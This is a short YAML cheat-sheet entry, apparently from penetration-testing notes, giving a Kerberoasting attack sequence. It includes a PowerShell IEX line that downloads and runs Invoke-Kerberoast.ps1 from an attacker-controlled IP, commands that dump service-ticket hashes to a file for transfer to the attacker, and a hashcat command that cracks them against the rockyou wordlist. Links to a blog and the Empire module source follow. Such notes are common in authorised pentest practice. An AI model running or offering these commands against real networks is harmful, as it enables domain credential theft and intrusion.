---
functions:
  privilege-escalation:
    - description: Execute a function, script, or application as another user
      code: |
		(1)	IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.119.174/Invoke-Kerberoast.ps1'))
		(2)	Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb.txt
		(3) Transfer the file over to attacker's system for cracking
		(4) Choose the account you want to crack and make into a unique file (for speed purposes)
		(5)	hashcat -m 13100 sqlserver.kb /usr/share/wordlists/rockyou.txt --force
	  resources: |
		https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
		https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
---
